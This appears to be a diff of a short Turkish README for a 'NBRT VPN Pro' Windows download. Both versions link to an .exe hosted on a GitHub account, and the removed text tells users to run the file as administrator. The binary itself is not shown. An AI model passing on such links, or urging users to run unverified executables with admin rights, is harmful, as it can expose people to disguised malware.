@@ -1,9 +1,1 @@
-# 🛡️ NBRT VPN Pro
-
-Güvenli ve hızlı internet erişimi için Windows sürümünü aşağıdan indirebilirsiniz.
-
-## 🚀 İndirme Seçenekleri
-
-[![İndir NBRT VPN](https://img.shields.io/badge/İndir-NBRT_VPN_Pro-blue?style=for-the-badge&logo=windows&logoColor=white)](https://bro635756-spec.github.io/NBRT_VPN/NBRT_VPN.exe)
-
-> **Not:** İndirme işlemi başladıktan sonra dosyayı yönetici olarak çalıştırmayı unutmayın.
+[📥 NBRT VPN Pro İndir (.exe)](https://github.com/bro635756-spec/NBRT_VPN/raw/main/NBRT_VPN.exe)
